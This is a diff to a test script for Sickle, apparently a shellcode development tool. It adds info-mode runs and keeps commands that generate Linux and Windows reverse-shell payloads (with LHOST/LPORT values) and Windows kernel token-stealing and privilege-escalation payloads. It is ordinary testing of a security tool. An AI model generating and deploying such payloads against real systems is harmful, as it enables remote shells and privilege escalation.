@@ -17,13 +17,14 @@ if (sys.platform == "win32"):
 
 SICKLE_PATH = f"{os.path.dirname(__file__)}/../src"
 
-IGNORE = ['__init__.py', "__pycache__"]
+IGNORE = ['__init__.py', "__pycache__", "raw"]
 
-SLEEP_TIME = 1
+SLEEP_TIME = 5
 
 MODULE_TESTS = \
 {
-    "diff": [f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -m diff -r generic_sc BINFILE=modified_sc MODE=hexdump",
+    "diff": [f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -m diff",
+             f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -m diff -r generic_sc BINFILE=modified_sc MODE=hexdump",
              f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -m diff -r modified_sc BINFILE=generic_sc MODE=hexdump",
              f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -m diff -r generic_sc BINFILE=modified_sc MODE=byte",
              f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -m diff -r modified_sc BINFILE=generic_sc MODE=byte",
@@ -32,11 +33,14 @@ MODULE_TESTS = \
              f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -m diff -r generic_sc BINFILE=modified_sc MODE=asm",
              f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -m diff -r modified_sc BINFILE=generic_sc MODE=asm"],
 
-    "badchar": [f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -m badchar -f c"],
+    "badchar": [f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -m badchar",
+                f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -m badchar -f c"],
 
-    "disassemble": [f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -m disassemble -r generic_sc"],
+    "disassemble": [f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -m disassemble",
+                    f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -m disassemble -r generic_sc"],
 
-    "pinpoint": [f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -r generic_sc -b \"\\x00\\x0a\\x0d\" -m pinpoint -f c",
+    "pinpoint": [f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -m pinpoint",
+                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -r generic_sc -b \"\\x00\\x0a\\x0d\" -m pinpoint -f c",
                  f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -r generic_sc -b \"\\x00\\x0a\\x0d\" -m pinpoint -f cs",
                  f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -r generic_sc -b \"\\x00\\x0a\\x0d\" -m pinpoint -f bash",
                  f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -a x64 -r generic_sc -b \"\\x00\\x0a\\x0d\" -m pinpoint -f java",
@@ -50,12 +54,25 @@ MODULE_TESTS = \
 
 PAYLOAD_TESTS = \
 {
-    "linux": [ f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=42 -f c",
+    "linux": [ f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -p linux/x86/shell_reverse_tcp",
+               f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=42 -f c",
+
+               f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -p linux/aarch64/shell_reverse_tcp",
                f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p linux/aarch64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f c", ],
-    "windows": [ f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p windows/x64/kernel_token_stealer -f c",
+
+    "windows": [ f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -p windows/x64/kernel_token_stealer",
+                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p windows/x64/kernel_token_stealer -f c",
+
+                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -p windows/x64/kernel_ace_edit",
                  f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p windows/x64/kernel_ace_edit PROCESS=AggregatorHost.exe -f c",
+
+                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -p windows/x64/kernel_sysret",
                  f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p windows/x64/kernel_sysret -f c",
+
+                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -p windows/x64/shell_reverse_tcp",
                  f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p windows/x64/shell_reverse_tcp LHOST=192.168.81.144 LPORT=1337 -f c",
+
+                 f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -i -p windows/x86/kernel_token_stealer",
                  f"{PYTHON_NAME} -B {SICKLE_PATH}/sickle.py -p windows/x86/kernel_token_stealer -f c", ]
 }
 
